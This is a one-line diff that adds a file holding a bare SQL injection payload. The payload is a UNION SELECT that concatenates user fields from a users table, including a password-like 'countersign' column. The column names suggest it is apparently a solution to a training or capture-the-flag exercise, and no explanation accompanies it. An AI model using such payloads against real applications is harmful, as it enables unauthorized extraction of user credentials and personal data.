@@ -1,0 +1,1 @@
+5 union (select user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) from users)
